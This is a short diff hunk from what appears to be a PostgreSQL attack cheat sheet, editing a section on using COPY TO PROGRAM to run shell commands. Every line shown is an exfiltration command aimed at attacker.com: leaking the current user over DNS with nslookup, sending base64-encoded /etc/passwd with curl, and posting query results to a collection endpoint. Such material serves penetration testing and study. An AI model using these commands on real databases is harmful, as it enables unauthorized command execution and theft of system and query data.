@@ -54,7 +54,7 @@ If you have superuser privileges, `COPY TO PROGRAM` executes shell commands:
 COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com';
 
 -- HTTP-based exfiltration
-COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=$(cat /etc/passwd | base64)';
+COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=$(base64 /etc/passwd)';
 
 -- Exfiltrate query results
 COPY (SELECT version()) TO PROGRAM 'curl -d @- http://attacker.com/collect';
